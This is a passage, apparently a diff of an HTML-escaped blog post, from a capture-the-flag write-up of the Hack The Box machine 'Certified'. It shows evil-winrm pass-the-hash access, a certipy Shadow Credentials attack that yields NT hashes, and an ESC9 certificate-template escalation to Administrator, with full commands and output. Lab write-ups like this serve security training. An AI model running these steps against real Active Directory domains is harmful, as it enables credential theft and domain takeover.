- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Successfully restored the old Key Credentials &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;management_svc&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; NT &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;management_svc&apos;&lt;/span&gt;: a091c1832bcdd4677c28b5a6a1295584
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;management_svc&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a091c1832bcdd4677c28b5a6a1295584&lt;/code&gt;. Let’s try to authenticate via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; management_svc &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; a091c1832bcdd4677c28b5a6a1295584
-
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;quoting_detection_proc&lt;span class=&quot;s1&quot;&gt;&apos; for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\management_svc\Documents&amp;gt; whoami
-certified\management_svc
-*Evil-WinRM* PS C:\Users\management_svc\Documents&amp;gt; cat ~/Desktop/user.txt
-[REDACTED]
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-6.png&quot; alt=&quot;certified-6.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Here we go!&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-3-lateral-movement-management_svc---ca_operator&quot;&gt;🤸 3. Lateral Movement (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;management_svc&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca_operator&lt;/code&gt;)&lt;/h2&gt;
-
-&lt;p&gt;Via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GenericAll&lt;/code&gt; we perform a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shadow Credentials&lt;/code&gt; attack (again) in order to retrieve ca_operator’s NTLM hash:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certipy-ad shadow auto &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; management_svc@&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :a091c1832bcdd4677c28b5a6a1295584 &lt;span class=&quot;nt&quot;&gt;-account&lt;/span&gt; ca_operator &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; dc01.&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;                                                                                                  
-Certipy v5.0.4 - by Oliver Lyak &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ly4k&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Targeting user &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Generating certificate
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Certificate generated
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Generating Key Credential
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Key Credential generated with DeviceID &lt;span class=&quot;s1&quot;&gt;&apos;7d07635e39a348a081aa6bc57309cf0a&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Adding Key Credential with device ID &lt;span class=&quot;s1&quot;&gt;&apos;7d07635e39a348a081aa6bc57309cf0a&apos;&lt;/span&gt; to the Key Credentials &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Successfully added Key Credential with device ID &lt;span class=&quot;s1&quot;&gt;&apos;7d07635e39a348a081aa6bc57309cf0a&apos;&lt;/span&gt; to the Key Credentials &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Authenticating as &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt; with the certificate
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Certificate identities:
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;     No identities found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this certificate
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using principal: &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator@certified.htb&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Trying to get TGT...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Got TGT
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Saving credential cache to &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator.ccache&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Wrote credential cache to &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator.ccache&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Trying to retrieve NT &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Restoring the old Key Credentials &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Successfully restored the old Key Credentials &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; NT &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;: b4b86f45c6018f1b664f70805f45d8f2
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca_operator&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b4b86f45c6018f1b664f70805f45d8f2&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certipy-ad find &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; dc01.&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; ca_operator &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :b4b86f45c6018f1b664f70805f45d8f2 &lt;span class=&quot;nt&quot;&gt;-stdout&lt;/span&gt;
-Certipy v5.0.4 - by Oliver Lyak &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ly4k&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Finding certificate templates
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found 34 certificate templates
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Finding certificate authorities
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found 1 certificate authority
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found 12 enabled certificate templates
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Finding issuance policies
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found 15 issuance policies
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found 0 OIDs linked to templates
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Retrieving CA configuration &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;certified-DC01-CA&apos;&lt;/span&gt; via RRP
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Successfully retrieved CA configuration &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;certified-DC01-CA&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Checking web enrollment &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;CA &lt;span class=&quot;s1&quot;&gt;&apos;certified-DC01-CA&apos;&lt;/span&gt; @ &lt;span class=&quot;s1&quot;&gt;&apos;DC01.certified.htb&apos;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Error checking web enrollment: timed out
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Use &lt;span class=&quot;nt&quot;&gt;-debug&lt;/span&gt; to print a stacktrace
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Error checking web enrollment: timed out
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Use &lt;span class=&quot;nt&quot;&gt;-debug&lt;/span&gt; to print a stacktrace
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enumeration output:
-Certificate Authorities
-  0
-    CA Name                             : certified-DC01-CA
-    DNS Name                            : DC01.certified.htb
-    Certificate Subject                 : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;certified-DC01-CA, &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;certified, &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
-    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
-    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
-    Certificate Validity End            : 2124-05-13 15:43:41+00:00
-    Web Enrollment
-      HTTP
-        Enabled                         : False
-      HTTPS
-        Enabled                         : False
-    User Specified SAN                  : Disabled
-    Request Disposition                 : Issue
-    Enforce Encryption &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Requests     : Enabled
-    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
-    Permissions
-      Owner                             : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrators
-      Access Rights
-        ManageCa                        : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrators
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;omain Admins
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\E&lt;/span&gt;nterprise Admins
-        ManageCertificates              : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrators
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;omain Admins
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\E&lt;/span&gt;nterprise Admins
-        Enroll                          : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;uthenticated Users
-Certificate Templates
-  0
-    Template Name                       : CertifiedAuthentication
-    Display Name                        : Certified Authentication
-    Certificate Authorities             : certified-DC01-CA
-    Enabled                             : True
-    Client Authentication               : True
-    Enrollment Agent                    : False
-    Any Purpose                         : False
-    Enrollee Supplies Subject           : False
-    Certificate Name Flag               : SubjectAltRequireUpn
-                                          SubjectRequireDirectoryPath
-    Enrollment Flag                     : PublishToDs
-                                          AutoEnrollment
-                                          NoSecurityExtension
-    Extended Key Usage                  : Server Authentication
-                                          Client Authentication
-    Requires Manager Approval           : False
-    Requires Key Archival               : False
-    Authorized Signatures Required      : 0
-    Schema Version                      : 2
-    Validity Period                     : 1000 years
-    Renewal Period                      : 6 weeks
-    Minimum RSA Key Length              : 2048
-    Template Created                    : 2024-05-13T15:48:52+00:00
-    Template Last Modified              : 2024-05-13T15:55:20+00:00
-    Permissions
-      Enrollment Permissions
-        Enrollment Rights               : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;perator ca
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;omain Admins
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\E&lt;/span&gt;nterprise Admins
-      Object Control Permissions
-        Owner                           : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator
-        Full Control Principals         : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;omain Admins
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\E&lt;/span&gt;nterprise Admins
-        Write Owner Principals          : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;omain Admins
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\E&lt;/span&gt;nterprise Admins
-        Write Dacl Principals           : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;omain Admins
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\E&lt;/span&gt;nterprise Admins
-        Write Property Enroll           : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;omain Admins
-                                          CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\E&lt;/span&gt;nterprise Admins
-    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Enrollable Principals      : CERTIFIED.HTB&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;perator ca
-    &lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Vulnerabilities
-      ESC9                              : Template has no security extension.
-    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Remarks
-      ESC9                              : Other prerequisites may be required &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this to be exploitable. See the wiki &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more details.
-&amp;lt;SNIP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-4-privilege-escalation-ca_operator---administrator&quot;&gt;📈 4. Privilege Escalation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca_operator&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;)&lt;/h2&gt;
-
-&lt;p&gt;In order to exploit ESC9:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;Change ca_operators’s UPN to match Administrator’s UPN:&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certipy-ad account update &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; management_svc@&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :a091c1832bcdd4677c28b5a6a1295584 &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; ca_operator &lt;span class=&quot;nt&quot;&gt;-upn&lt;/span&gt; Administrator@&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
- Certipy v5.0.4 - by Oliver Lyak &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ly4k&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Updating user &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;:
-     userPrincipalName                   : Administrator@certified.htb
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Successfully updated &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Request certificate as ca_operator (automatically maps to Administrator):&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certipy-ad req &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; ca_operator@&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :b4b86f45c6018f1b664f70805f45d8f2 &lt;span class=&quot;nt&quot;&gt;-ca&lt;/span&gt; certified-DC01-CA &lt;span class=&quot;nt&quot;&gt;-template&lt;/span&gt; CertifiedAuthentication &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
- Certipy v5.0.4 - by Oliver Lyak &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ly4k&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting certificate via RPC
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Request ID is 12
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Successfully requested certificate
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Got certificate with UPN &lt;span class=&quot;s1&quot;&gt;&apos;Administrator@certified.htb&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Certificate has no object SID
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Try using &lt;span class=&quot;nt&quot;&gt;-sid&lt;/span&gt; to &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;the object SID or see the wiki &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more details
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Saving certificate and private key to &lt;span class=&quot;s1&quot;&gt;&apos;administrator.pfx&apos;&lt;/span&gt;
- File &lt;span class=&quot;s1&quot;&gt;&apos;administrator.pfx&apos;&lt;/span&gt; already exists. Overwrite? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y/n - saying no will save with a unique filename&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: y
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Wrote certificate and private key to &lt;span class=&quot;s1&quot;&gt;&apos;administrator.pfx&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Revert ca_operator’s UPN:&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certipy-ad account update &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; management_svc@&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :a091c1832bcdd4677c28b5a6a1295584 &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; ca_operator &lt;span class=&quot;nt&quot;&gt;-upn&lt;/span&gt; ca_operator@&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
- Certipy v5.0.4 - by Oliver Lyak &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ly4k&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Updating user &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;:
-     userPrincipalName                   : ca_operator@certified.htb
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Successfully updated &lt;span class=&quot;s1&quot;&gt;&apos;ca_operator&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Cash:&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certipy-ad auth &lt;span class=&quot;nt&quot;&gt;-pfx&lt;/span&gt; administrator.pfx &lt;span class=&quot;nt&quot;&gt;-domain&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
- Certipy v5.0.4 - by Oliver Lyak &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ly4k&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Certificate identities:
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;     SAN UPN: &lt;span class=&quot;s1&quot;&gt;&apos;Administrator@certified.htb&apos;&lt;/span&gt;
